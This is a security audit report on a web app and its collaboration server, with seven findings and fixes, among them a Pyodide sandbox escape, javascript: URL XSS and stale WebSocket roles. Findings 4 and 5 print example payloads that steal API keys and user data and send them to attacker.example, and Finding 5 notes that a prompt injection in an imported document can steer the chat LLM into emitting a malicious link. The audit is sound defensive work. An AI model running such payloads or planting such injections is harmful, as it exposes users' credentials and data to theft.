# Security Audit — apps/web + apps/hocuspocus (2026-04-29 Session 1)

- **Worktree**: `.worktrees/sec-frontend`
- **Branch**: `audit/security-2026-04-29-frontend` (forked from `codex/connector-platform-spec` @ `92302cb`)
- **Scope**: `apps/web/**`, `apps/hocuspocus/**` (read-only)
- **Baseline**: `docs/review/2026-04-28-ralph-audit/CONSOLIDATED.md`
- **Method**: 1 full-scope enumeration pass + 5 parallel false-positive verification passes; only findings with verifier confidence ≥8 (or Low severity but verified-real) included.

## Resolution status (fix branch `fix/security-2026-04-29-frontend`, off `origin/main`)

| # | Severity | Finding | Status |
|---|----------|---------|--------|
| 1 | High     | S1-001 slash menu keydown | ✅ Already in `origin/main` via PR #162 (`3f1449c`) |
| 2 | Critical | S1-002 Hocuspocus cookie auth | ✅ Already in `origin/main` via PR #162 |
| 3 | Low      | S1-003 onUpgrade clean reject | ✅ Already in `origin/main` via PR #162 |
| 4 | High     | Pyodide same-origin sandbox escape | ✅ Fixed — commit `acfb92d` |
| 5 | Medium   | Citation chips `javascript:` URL | ✅ Fixed — commit `8707d2e` |
| 6 | Medium   | Research-meta `javascript:` URL | ✅ Fixed — commit `8707d2e` |
| 7 | Medium   | Hocuspocus stale role / session | ✅ Fixed — commit `c5c7f2f` |

`codex/connector-platform-spec` (where the audit ran) diverged from `main` before PR #162 landed, so the S1-* findings looked open during enumeration. The fix branch is off `origin/main` which already has PR #162, so the actual fix work was Findings 4-7.

## Summary

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High | 2 |
| Medium | 3 |
| Low | 1 |
| **Total** | **7** |

**Branch-state caveat.** Three findings (S1-001 / S1-002 / S1-003) are listed as closed by PR #162 in the consolidated Ralph audit doc. Direct code reads on this branch's HEAD (`92302cb`) show the cited fixes are absent — the audit branch was created from a tree that pre-dates or was rebased without PR #162's frontend/collab hardening. Whether this is a revert, a missing rebase, or a working-tree skew, the *current code state* is what gets shipped from this branch, so the gaps are reported as VALID. Recommended remediation step before fixing anything else: rebase or cherry-pick PR #162 (`3f1449c`) and re-verify.

---

## Finding 1 — S1-001: Slash menu keydown listener fires outside the editor

- **Severity**: High
- **Category**: input-handling / collaborative-data-corruption
- **Location**: `apps/web/src/components/editor/plugins/slash.tsx:185-203`
- **Prior audit ID**: S1-001 (claimed closed by PR #162 — **regressed/missing on this branch**)
- **Verifier confidence**: 10/10

### Description
The slash plugin registers a `window`-scoped keydown listener that opens the slash menu on any unmodified `/` keypress regardless of where focus is. There is no check that `document.activeElement` is inside `[data-slate-editor="true"]`. Repo-wide grep for `data-slate-editor` returns zero matches in `apps/web/src`, confirming the gate from PR #162 was never added (or was reverted) on this branch. When a slash-menu command later runs `editor.tf.deleteBackward("character")`, it deletes the last character of editor content even when the `/` was typed in the title input or comment composer.

### Exploit / impact
A user typing `/` anywhere on the page (search box, comment composer, note title) while a Plate editor is mounted opens the slash menu; selecting any command silently mutates editor content via `deleteBackward`. In a collaborative session, this propagates to every other connected client through Yjs — silent cross-user data corruption with no user-visible cause.

### Server-side guard?
N/A — this is a data-integrity bug, not an auth bypass.

### Recommendation
Re-apply PR #162's gate: only handle the keydown when `document.activeElement?.closest('[data-slate-editor="true"]')` resolves to the active editor's root.

---

## Finding 2 — S1-002: Hocuspocus client passes empty token, server has no cookie-header fallback

- **Severity**: Critical
- **Category**: ws-auth / authn-bypass
- **Location**:
  - `apps/web/src/hooks/useCollaborativeEditor.ts:63`
  - `apps/hocuspocus/src/auth.ts:30-33, 39-69, 94`
  - `apps/hocuspocus/src/server.ts:52-67`
- **Prior audit ID**: S1-002 (claimed closed by PR #162 — **regressed/missing on this branch**)
- **Verifier confidence**: 10/10

### Description
The browser-side Hocuspocus provider hardcodes `token: ""` in its config because Better Auth's session cookie is `httpOnly` and unreadable from JS. PR #162 introduced a server-side fallback that reads the WS upgrade `Cookie:` header and verifies the session from there. None of that fallback exists on this branch:

- `useCollaborativeEditor.ts:63` — `token: ""` literal.
- `apps/hocuspocus/src/auth.ts` — `AuthDeps` interface (lines 30-33) accepts only `{ resolveRole, verifySession }`. `makeAuthenticate` (lines 39-69) consumes `payload.token` only and calls `verifySession(token)`. No `cookieHeader` parameter.
- `apps/hocuspocus/src/auth.ts:94` — `verifySession` returns `null` immediately on empty input (`if (!raw) return null`).
- `apps/hocuspocus/src/server.ts:52-67` — `onAuthenticate` forwards only `payload.token`; never references `payload.requestHeaders` or any cookie source.

`verifySession("")` ⇒ `null` ⇒ `onAuthenticate` throws `unauthenticated`. As coded, every browser WS connect should fail.

### Exploit / impact
Two paths, both bad:
1. **If connections somehow succeed** (e.g., a default-readonly path elsewhere in the ancestry, a prior-context grant, or a permissive Hocuspocus extension): an unauthenticated client can subscribe to any `page:<noteId>` they can guess and observe every Yjs update from authorized editors — full real-time content disclosure across workspace boundaries. Note IDs may be enumerable via the public web app routes.
2. **If connections fail (closer to expected)**: collaborative editing is silently broken in production. Not a security vuln by itself, but an availability collapse — and any *side path* that bypasses the throw (e.g., a connection re-established with stale `payload.connectionConfig.readOnly` from a previous attempt) lands back in path 1.

Either branch warrants Critical severity until verified empirically.

### Server-side guard?
The throw in `onAuthenticate` is the only gate. Origin filtering at `onUpgrade` is a thin pre-auth check that any non-browser client can bypass by spoofing the `Origin:` header.

### Recommendation
Re-apply PR #162's three-part cookie-header fallback:
1. `AuthDeps` accepts an optional `cookieHeader` parameter; `verifySession` is tried with the bearer token first, then with the parsed cookie.
2. `onAuthenticate` forwards `payload.requestHeaders.cookie` to the fallback.
3. Client emits a non-empty sentinel string in `token` so `@hocuspocus/provider` actually fires the AUTH-message handshake.

---

## Finding 3 — S1-003: Disallowed origin leaves WS socket open + emits unhandled rejection

- **Severity**: Low
- **Category**: ws-origin / dx-quality (defense-in-depth)
- **Location**: `apps/hocuspocus/src/server.ts:45-51`
- **Prior audit ID**: S1-003 (claimed closed by PR #162 — **regressed/missing on this branch**)
- **Verifier confidence**: 10/10

### Description
`onUpgrade` blocks disallowed origins by `throw new Error("Forbidden origin")`. The handler destructures only `{ request }` — it never receives `socket` and so cannot write a clean HTTP 403 or destroy the underlying TCP socket. PR #162 added (a) `socket.write("HTTP/1.1 403 ...")`, (b) `socket.destroy()`, and (c) `throw null` to suppress `@hocuspocus/server`'s unhandled-rejection warning. None of those are present.

### Exploit / impact
Not directly exploitable. Disallowed clients see a hung socket until they time out, and each blocked connection logs an unhandled rejection on the server. Listed for completeness because the prior audit tracked it and the audit doc claims it closed.

### Recommendation
Re-apply PR #162's clean-rejection pattern with a destination test (`apps/hocuspocus/tests/origins.test.ts` from PR #162) covering allowed / disallowed / missing origins.

---

## Finding 4 — Pyodide canvas runs in main page realm (no iframe sandbox)

- **Severity**: High
- **Category**: stored-xss / sandbox-escape
- **Location**:
  - `apps/web/src/components/canvas/PyodideRunner.tsx:64-104, 168` (mounting + auto-execute on tab open)
  - `apps/web/src/components/tab-shell/viewers/canvas-viewer.tsx:197-205` (python branch chooses `PyodideRunner` directly)
  - `apps/web/src/lib/pyodide-loader.ts:14-32` (script injected into `document.head`)
  - `apps/web/src/components/canvas/CanvasFrame.tsx:64-75` (the *correctly* sandboxed reference path used by react/html/javascript)
  - `apps/web/src/stores/tabs-store.ts:40-45` (canvas notes auto-route to canvas mode for any viewer)
  - `apps/web/src/components/share/public-note-view.tsx:18-55` (mitigates the public-share path — static render only)
- **Prior audit ID**: NEW
- **Verifier confidence**: 10/10

### Description
For canvas notes with `canvasLanguage === "python"`, the viewer mounts `PyodideRunner` directly inside the parent React tree — *not* inside a sandboxed iframe. Pyodide is loaded from `cdn.jsdelivr.net` into the main page (`<script>` injected into `document.head`), so the resulting interpreter shares the OpenCairn web app's JS realm. `from js import ...` exposes `document`, `fetch`, `localStorage`, `window`, etc. by default — Python code can call same-origin authenticated APIs with `credentials: "include"`, read non-`httpOnly` cookies, read `localStorage` (Better Auth caches, BYOK metadata, Yjs state), and exfiltrate via cross-origin `fetch`.

The non-Python branches go through `CanvasFrame`, which uses a cross-origin Blob iframe with `sandbox="allow-scripts"` (no `allow-same-origin`) — exactly the boundary that's missing for Python.

The auto-execute on mount (empty-deps `useEffect` in `PyodideRunner`) means simply opening the note tab fires the code; no click required.

### Exploit / impact
Stored XSS-equivalent gated on workspace editor membership:
1. Attacker is a workspace member with editor access on a canvas note (project-level membership is sufficient; Plan 2C explicit share is not required).
2. Attacker sets `canvasLanguage = "python"` and writes Python that does `from js import fetch; await fetch("/api/users/me/byok-keys", {credentials:"include"})`, reads the response, exfiltrates via `fetch("https://attacker.example/", {method:"POST", body: <stolen JSON>})`.
3. When *any other* workspace member opens the canvas tab, `PyodideRunner` mounts and `runPythonAsync(source)` executes the attacker's payload in the victim's main-origin browser context. All session-attached APIs are reachable, including BYOK keys, integration tokens, deep-research outputs, and notes the victim has access to but the attacker does not.

The 10s execution timeout does not mitigate — a single `await fetch` round-trip fits, and the attacker can also schedule work via `setInterval`/microtasks before yielding. The public `/s/[token]` share viewer is *not* affected because it static-renders only.

### Server-side guard?
None. Server stores canvas source verbatim and returns it on read; sandbox enforcement is purely a client-rendering decision.

### Recommendation
Route the Python branch through the same iframe sandbox path as `react`/`html`/`javascript`: load Pyodide *inside* the cross-origin Blob iframe, not in the parent tree. Confirm the iframe has `sandbox="allow-scripts"` with no `allow-same-origin`. Postmessage Pyodide stdout/figures back to the parent (the existing `CANVAS_RESIZE` / `CANVAS_ERROR` channel works for this).

---

## Finding 5 — Citation chips render `Citation.url` without scheme allowlist (`javascript:` XSS)

- **Severity**: Medium
- **Category**: xss / javascript-uri
- **Location**: `apps/web/src/components/agent-panel/citation-chips.tsx:25-29`
- **Prior audit ID**: NEW
- **Verifier confidence**: 8/10

### Description
```tsx
const href = c.url ?? (c.noteId ? `/${locale}/app/notes/${c.noteId}` : "#");
return (
  <a key={c.index} href={href} target={c.url ? "_blank" : undefined} ...>
```
`c.url` flows unchanged from `apps/api/src/lib/chat-llm.ts:82` where citations are populated from RAG hits — i.e., from user-imported documents and LLM-grounded sources. There is no scheme check on either the API side or the client. React 19 logs a console warning for `javascript:` `href` values but does *not* block them; the click still executes the URI in the page origin. `target="_blank"` does not change this — the script runs before any navigation.

### Exploit / impact
1. Attacker imports a document (or seeds an existing one) whose RAG-extractable metadata or content yields a `javascript:` citation URL. Prompt-injection of an imported note can also steer the chat LLM to emit the malicious URL directly in its citation output.
2. Victim chats with the agent in a workspace that includes the poisoned content; the citation chip is rendered.
3. Victim clicks the chip ⇒ `javascript:fetch('/api/users/me', {credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://attacker.example/?d='+encodeURIComponent(t)))` runs in the OpenCairn origin.

### Server-side guard?
No. `apps/api/src/lib/chat-llm.ts` does not validate citation URL schemes; `chat_messages.content` writes accept whatever the LLM emits.

### Recommendation
Promote the existing `safeHref` in `apps/web/src/components/share/plate-static-renderer.tsx:34` to a shared utility (e.g. `apps/web/src/lib/url/safe-href.ts`) that allowlists `http:`, `https:`, `mailto:`, and relative paths, and apply it everywhere user-controlled URLs reach `<a href={...}>`. Apply to citation chips, research-meta block (Finding 6), `apps/web/src/components/chat/lit-result-card.tsx:83`, and `lit-search-viewer.tsx:158` (out of scope for this report but same pattern).

---

## Finding 6 — Research-meta block renders source URLs without scheme allowlist (`javascript:` XSS)

- **Severity**: Medium
- **Category**: xss / javascript-uri
- **Location**: `apps/web/src/components/editor/blocks/research-meta/ResearchMetaElement.tsx:88-97`
- **Prior audit ID**: NEW
- **Verifier confidence**: 8/10

### Description
```tsx
{meta.sources.map((s) => (
  <li key={s.seq}>
    <a href={s.url} target="_blank" rel="noreferrer" className="underline">
      {s.title}
    </a>
  </li>
))}
```
`meta.sources[].url` originates from Deep Research / Gemini grounding output — i.e., URLs that Gemini reports for arbitrary scraped web pages. No upstream scheme filter visible in `apps/worker` persistence or in the API read path. Same React/`javascript:` execution semantics as Finding 5.

The codebase already has a working `safeHref` in `plate-static-renderer.tsx:34-56` (the public share read-only renderer) that explicitly defangs `javascript:` / `data:` / `vbscript:`. The threat model is recognized; this code path simply was not covered.

### Exploit / impact
A Deep Research run scrapes a hostile or compromised site that returns `javascript:...` as a source URL (or attacker poisons a research subject they control). The agent persists the URL into `research_runs.sources`; the editor's `ResearchMetaElement` renders it as `<a href="javascript:..." target="_blank">`. Victim clicks "Source [N]" ⇒ script runs in OpenCairn origin.

### Server-side guard?
No. Research persistence path does not validate URL schemes.

### Recommendation
Apply the shared `safeHref` utility (see Finding 5 recommendation). Consider also validating on the worker side at persistence time so the bad data never enters the DB.

---

## Finding 7 — Hocuspocus role/readOnly is decided once at connect; revocation does not propagate

- **Severity**: Medium
- **Category**: authz / stale-session
- **Location**:
  - `apps/hocuspocus/src/auth.ts:39-69` (one-shot resolveRole)
  - `apps/hocuspocus/src/auth.ts:100-114` (one-shot session expiry check)
  - `apps/hocuspocus/src/server.ts:42-84` (no rechecking hooks registered)
  - `apps/hocuspocus/src/readonly-guard.ts:53-65` (reads stale `ctx.readOnly`)
  - `apps/hocuspocus/src/persistence.ts` (`onStoreDocument` mirror writes are not role-gated)
- **Prior audit ID**: NEW
- **Verifier confidence**: 9/10

### Description
`makeAuthenticate` calls `resolveRole` exactly once and freezes the resulting `readOnly` flag onto `payload.connectionConfig.readOnly` (`server.ts:65`). The server registers only `onUpgrade` (origin), `onAuthenticate` (one-shot), three extensions (`readonly-guard`, `block-orphan-reaper`, `persistence`), and `onDisconnect` (logging) — there is no `beforeHandleMessage`, no periodic timer, no Postgres `LISTEN/NOTIFY`, no Redis pub/sub, no admin "kick(userId)" endpoint, and no recurring `verifySession` call.

`readonly-guard.onChange` reads `payload.context.readOnly` from the connect-time context and never re-queries `resolveRole`. Confirmed by repo-wide grep: zero `resolveRole` references outside `auth.ts` / `permissions-adapter.ts`.

Better Auth session expiry runs only inside `onAuthenticate` (`gt(sessionTable.expiresAt, new Date())`), so a session that expires mid-WS-life does not trigger any disconnect.

`persistence.onStoreDocument` mirror writes to `notes.content` / `notes.content_text` are not role-gated; they run unless `connection.readOnly` is `true` or `readonly-guard.onChange` throws — both of which use the *stale* flag.

### Exploit / impact
Concrete (not theoretical) — exploits the standard admin revoke flow:
1. Victim user has editor role on a sensitive note and keeps an editor tab open.
2. Workspace admin demotes them to viewer or removes their per-note grant via the HTTP API.
3. The HTTP API correctly rejects further mutations from the user's HTTP requests.
4. The victim's still-connected Hocuspocus WS retains `readOnly: false`. They (or anyone with control of their machine, e.g. through finding 4 or 5) continue making edits via the Yjs provider; updates persist via `notes.content` writes.
5. State persists until the user manually closes the tab, network drops, or the server restarts.

Same applies to revoked workspace membership and to Better Auth session expiry.

### Server-side guard?
HTTP routes in `apps/api` correctly enforce post-revoke; the WS path is its own surface and isn't re-checked.

### Recommendation
Either (a) periodically re-check `resolveRole` (e.g. in `beforeHandleMessage` with a per-connection cache + 30-60s TTL), or (b) bind a Postgres `LISTEN`/Redis-pubsub channel that fires on `note_permissions` / project membership / workspace membership / session-revocation changes and force-disconnect affected connections. Option (b) is cleaner; option (a) bounds blast radius without wider plumbing.

---

## Verified closed (no current-branch evidence of regression)

- **S2-001** (`addTab` activeId) — branch ancestry contains the prior fix; no contrary evidence in slash/cache code.
- **S2-006/S2-007** (chat SSE streaming + error handling) — the `getReader()` + eventsource-parser path is in place; no regression observed.
- **S2-026** (chat history hardcoded `[]`) — closed in branch ancestry per `e60e6ac` (`fix(api): load chat_messages history into runAgent (audit S2-026)`).

These were sampled, not exhaustively re-verified line-by-line.

---

## Branch state action item (P0)

Three S1-* findings (1, 2, 3) are absent in current code despite the audit doc claiming closure. Before fixing anything else on this branch:

1. Confirm branch lineage: `git merge-base --is-ancestor 3f1449c HEAD`. If false, rebase or cherry-pick PR #162 (`3f1449c`) before any other security work.
2. Re-run this report's verification steps to confirm the three S1-* fixes land.
3. Then address Findings 4–7.

If the lineage check returns true (i.e., `3f1449c` *is* in the ancestry), then PR #162's effect was lost via a later revert or working-tree skew — investigate `git log -- apps/web/src/components/editor/plugins/slash.tsx apps/hocuspocus/src/auth.ts apps/hocuspocus/src/server.ts apps/web/src/hooks/useCollaborativeEditor.ts` to find the regressing commit.

---

## Methodology

1. **Enumeration pass**: One Security Engineer sub-agent enumerated 14 candidate findings across `apps/web` + `apps/hocuspocus` against the focus areas (XSS, CSP, CSRF, cookie/storage, SSE, Yjs token verification, client-side IDOR, external origins).
2. **Verification pass**: Five parallel Security Engineer sub-agents verified each finding against current code, applying the skill's hard exclusions (DoS, secrets-on-disk, log spoofing, regex DoS, doc-only files, lack-of-hardening, framework-escape XSS rules, etc.) and false-positive precedents.
3. **Threshold filter**: Findings with verifier confidence ≥ 8 retained; one Low-severity finding (Finding 3) retained because the verifier confirmed the gap with confidence 10 (Low severity is from blast-radius, not from confidence). Findings 7-original (lit-search), 9, 10, 11, 12, 14-original (WS origin spoofability) dropped.

## Exit condition

User-specified: "2회 연속 Critical/High = 0 또는 코드 전부 1회 통과." This was one full pass over `apps/web` + `apps/hocuspocus`. With 1 Critical + 2 High remaining open, a second pass is warranted *after* fixes land — not on the current code state. Recommended next step: address Findings 1-4 in priority order, then re-run this audit's enumeration phase.
